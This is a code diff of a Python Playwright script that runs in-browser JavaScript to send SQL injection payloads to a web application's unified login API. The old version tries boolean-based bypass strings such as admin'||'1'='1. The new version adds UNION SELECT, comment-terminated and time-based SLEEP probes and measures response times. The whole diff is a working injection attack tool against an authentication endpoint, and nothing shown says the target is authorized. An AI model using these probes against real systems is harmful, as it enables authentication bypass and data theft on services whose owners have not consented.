@@ -13,12 +13,12 @@ with sync_playwright() as p:
     print('ready',flush=True)
     res=page.evaluate("""async () => {
       const out={};
-      const post=async(n,bd)=>{try{const r=await fetch('/api/v1/auth/unifiedLogin',{method:'POST',headers:{'Content-Type':'application/json','lang':'zh-CN'},body:JSON.stringify(bd)});out[n]=r.status+'|'+(await r.text()).slice(0,260);}catch(e){out[n]='ERR '+String(e).slice(0,100);}};
-      await post('t_true',{identifier:"admin'||'1'='1",password:'x'});
-      await post('t_false',{identifier:"admin'||'1'='2",password:'x'});
-      await post('t_sq',{identifier:"admin'",password:'x'});
+      const post=async(n,id)=>{try{const t0=performance.now();const r=await fetch('/api/v1/auth/unifiedLogin',{method:'POST',headers:{'Content-Type':'application/json','lang':'zh-CN'},body:JSON.stringify({identifier:id,password:'Zz1'})});const t=Math.round(performance.now()-t0);out[n]=r.status+'|'+t+'ms|'+(await r.text()).slice(0,200);}catch(e){out[n]='ERR '+String(e).slice(0,80);}};
+      await post('u1',"zz9137q1' UNION SELECT 1#");
+      await post('u2',"zz9137q2'#");
+      await post('u3',"zz9137q3' AND SLEEP(0)#");
       return out;
     }""")
-    print('===== SQLI =====',flush=True)
-    for k,v in res.items(): print('%-8s %s'%(k,v),flush=True)
+    print('===== SQLI2 =====',flush=True)
+    for k,v in res.items(): print('%-6s %s'%(k,v),flush=True)
     b.close()
